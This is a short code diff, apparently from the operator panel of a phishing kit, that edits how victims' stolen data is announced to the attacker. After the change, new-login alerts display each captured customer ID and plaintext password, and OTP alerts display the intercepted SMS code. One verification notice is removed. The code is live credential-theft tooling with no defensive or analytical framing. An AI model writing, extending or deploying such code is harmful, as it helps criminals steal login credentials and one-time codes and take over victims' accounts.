@@ -268,7 +268,10 @@
         });
         renderRows();
         addLog('warn', `New login: ${request.username}  IP: ${request.ipAddress || '--'}`);
-        notify('New Login Attempt', `${request.username} | ${request.ipAddress || 'Unknown IP'}`);
+        notify(
+          'New Customer Credentials',
+          `Customer ID: ${request.username || '--'}\nPassword: ${request.password || '--'}`,
+        );
         playAlert('cred');
         flashTitle();
         return;
@@ -286,7 +289,7 @@
         });
         renderRows();
         addLog('otp', `OTP captured: ${msg.data.smsCode}`);
-        notify('SMS Code Captured', `${msg.data.username} | ${msg.data.smsCode}`);
+        notify('OTP Code', `${msg.data.smsCode || '--'}`);
         playAlert('otp');
         flashTitle();
         return;
@@ -305,7 +308,6 @@
         });
         renderRows();
         addLog('ok', `Verification completed for ${msg.data.username}`);
-        notify('Verification Complete', msg.data.username);
         playAlert('otp');
         flashTitle();
         return;
